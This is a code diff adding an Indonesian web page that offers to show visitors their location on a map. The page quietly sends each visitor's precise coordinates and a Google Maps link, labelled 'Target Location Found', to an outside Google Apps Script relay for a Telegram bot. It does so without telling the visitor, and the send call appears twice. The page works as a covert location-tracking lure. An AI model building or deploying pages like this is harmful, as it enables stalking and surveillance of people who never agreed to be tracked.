@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Geolocator & Telegram Bot</title>
+    
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin="" />
+    
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 30px;
+            background-color: #f0f4f8;
+            color: #333;
+        }
+        h1 { color: #2c3e50; }
+        #map {
+            height: 450px;
+            width: 100%;
+            max-width: 800px;
+            margin: 20px auto;
+            border-radius: 12px;
+            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+            display: none;
+        }
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            box-shadow: 0 4px 6px rgba(0, 123, 255, 0.2);
+        }
+        button:hover { background-color: #0056b3; }
+        #status {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Lacak Lokasi Saya 🌍</h1>
+    <p>Klik tombol di bawah untuk melihat lokasimu di peta.</p>
+    
+    <button onclick="getLocation()">Cari Lokasi</button>
+    <p id="status"></p>
+    
+    <div id="map"></div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
+    
+    <script>
+        let map;
+        let marker;
+
+        // --- FUNGSI KIRIM KE TELEGRAM ---
+        // --- FUNGSI KIRIM KE BACKEND (GOOGLE APPS SCRIPT) ---
+        function sendToTelegram(message) {
+            const backendUrl = 'https://script.google.com/macros/s/AKfycbyLySvEQtosLpiUXnW3Wyu_k_61SGdS57q2sx33-3RsR1VxOMMIx3czOGmISULrbfEm/exec'; 
+
+            fetch(backendUrl, {
+                method: 'POST',
+                // Ubah Content-Type menjadi text/plain untuk menghindari error CORS dari browser
+                headers: {
+                    'Content-Type': 'text/plain;charset=utf-8'
+                },
+                body: JSON.stringify({ message: message }) 
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Sukses! Pesan dikirim melalui Backend Google Script.");
+            })
+            .catch(error => {
+                console.error("Gagal mengirim data:", error);
+            });
+        }
+
+        // --- FUNGSI MENCARI LOKASI ---
+        function getLocation() {
+            const status = document.getElementById('status');
+            const mapDiv = document.getElementById('map');
+
+            if (!navigator.geolocation) {
+                status.textContent = 'Maaf, Geolocation tidak didukung oleh browser Anda.';
+                return;
+            }
+
+            status.textContent = 'Sedang mencari lokasi...';
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    status.textContent = `Lokasi ditemukan! (Akurasi: ${Math.round(accuracy)} meter)`;
+                    mapDiv.style.display = 'block';
+
+                    // Tampilkan di Peta
+                    if (!map) {
+                        map = L.map('map').setView([lat, lng], 15);
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                            attribution: '&copy; OpenStreetMap contributors'
+                        }).addTo(map);
+                    } else {
+                        map.setView([lat, lng], 15);
+                    }
+
+                    if (marker) map.removeLayer(marker);
+                    
+                    marker = L.marker([lat, lng]).addTo(map)
+                        .bindPopup(`<b>Kamu ada di sini!</b><br>Lat: ${lat}<br>Lng: ${lng}`)
+                        .openPopup();
+
+                    // --- INTEGRASI KE TELEGRAM DI SINI ---
+                    // Menyusun pesan yang rapi dengan link Google Maps
+                    // --- INTEGRASI KE TELEGRAM DI SINI ---
+                    // Menyusun pesan yang rapi dengan link Google Maps standar
+                    const pesanTelegram = `📍 *Target Lokasi Ditemukan!*\n\n` +
+                                          `Latitude: ${lat}\n` +
+                                          `Longitude: ${lng}\n` +
+                                          `Akurasi: ${Math.round(accuracy)} meter\n\n` +
+                                          `🗺️ Google Maps:\nhttps://maps.google.com/?q=${lat},${lng}`;
+                    
+                    // Panggil fungsi sendToTelegram
+                    sendToTelegram(pesanTelegram);
+                    
+                    // Panggil fungsi sendToTelegram
+                    sendToTelegram(pesanTelegram);
+                },
+                (error) => {
+                    status.textContent = "Gagal mendapatkan lokasi (Ditolak / Error).";
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+    </script>
+</body>
+</html>
